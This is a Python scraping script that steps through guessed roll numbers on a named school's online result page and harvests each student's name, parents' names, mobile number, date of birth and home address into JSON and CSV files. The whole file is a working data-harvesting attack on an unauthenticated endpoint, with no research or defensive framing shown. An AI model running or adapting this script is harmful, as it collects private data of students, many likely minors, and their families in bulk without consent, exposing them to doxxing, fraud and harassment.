import requests
from bs4 import BeautifulSoup as ak
import json
import csv
import argparse

# Base URL
base_url = "http://school.sanjivanicollege.com/OnlineResult/Result_XI_XII_Prnt_I.aspx"

headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
}

# Save to JSON and CSV
def create_person_files(roll, name, father_name, mobile_no, mother_name, dob, address):
    person_details = {
        "roll": roll,
        "name": name,
        "father_name": father_name,
        "mother_name": mother_name,
        "mobile_no": mobile_no,
        "dob": dob,
        "address": address
    }

    with open('storage/shared/person_details12.json', 'a') as json_file:
        json.dump(person_details, json_file, indent=4)
        json_file.write(",\n")

    with open('storage/shared/person_details12.csv', 'a', newline='') as csv_file:
        writer = csv.DictWriter(csv_file, fieldnames=person_details.keys())
        writer.writerow(person_details)

# Argparse CLI
parser = argparse.ArgumentParser(description="Result Scraper with Dynamic Roll Generation")
parser.add_argument("--from_year", type=int, required=True, help="Start admission year (e.g., 15)")
parser.add_argument("--to_year", type=int, required=True, help="End admission year (e.g., 24)")
parser.add_argument("--param_class", type=str, default="11", help="Query param Class (e.g., 11)")
parser.add_argument("--param_year", type=str, default="12", help="Query param Year (e.g., 12)")

args = parser.parse_args()

print(f"\n[+] Scraping students from 20{args.from_year} to 20{args.to_year}...\n")

n = 1

for i, year in enumerate(range(args.from_year, args.to_year + 1)):
    class_year = str(i + 1).zfill(2)  # Auto-increment class year: 01 to 10
    print(class_year)
    for roll in range(1, 120):  # 001 to 130
        roll_str = str(roll).zfill(3)
        roll_no = f"{year}{class_year}{roll_str}"
        params = {
            "RollNo": roll_no,
            "Class": 11, #args.param_class,
            "Year": 11 #args.param_year
        }

        try:
            response = requests.get(base_url, headers=headers, params=params, timeout=10)
            if "No result found" not in response.text:
                soup = ak(response.content, "html.parser")
                roll = soup.find("span",id="RollNoLabel").text.strip()
                name = soup.find("span", id="nameLabel").text.strip()
                father = soup.find("span", id="fatherNameLabel").text.strip()
                mother = soup.find("span", id="motherNameLabel").text.strip()
                mobile = soup.find("span", id="telephoneLabel").text.strip()
                address = soup.find("span", id="residentAddressLabel").text.strip()
                dob = soup.find("span", id="dobLabel").text.strip()

                print(f"({n}) [VALID] Roll No: {roll_no} | Name: {name}")
                create_person_files(roll, name, father, mobile, mother, dob, address)
                n += 1

        except requests.exceptions.RequestException as e:
            print(f"[Error] Roll No: {roll_no} -> {str(e)}")

print("\n[✓] Scraping Completed Successfully.")
